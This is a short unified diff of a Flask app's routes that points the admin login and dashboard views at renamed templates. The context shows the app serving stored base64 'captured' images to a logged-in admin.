@@ -53,7 +53,7 @@ def login():
             session['admin_logged_in'] = True
             return redirect(url_for('dashboard'))
         error = 'Incorrect password.'
-    return render_template('index.html', error=error)
+    return render_template('admin_login.html', error=error)
 
 @app.route('/logout')
 def logout():
@@ -68,7 +68,7 @@ def dashboard():
         CapturedImage.captured_at.desc()
     ).paginate(page=page, per_page=20, error_out=False)
     total  = CapturedImage.query.count()
-    return render_template('about.html', images=images, total=total)
+    return render_template('admin_panel.html', images=images, total=total)
 
 @app.route('/image/<int:img_id>')
 @admin_required
@@ -77,7 +77,6 @@ def serve_image(img_id):
     img = CapturedImage.query.get_or_404(img_id)
     img_bytes = base64.b64decode(img.image_data)
     return send_file(io.BytesIO(img_bytes), mimetype='image/jpeg')
-
 @app.route('/download/<int:img_id>')
 @admin_required
 def download_image(img_id):
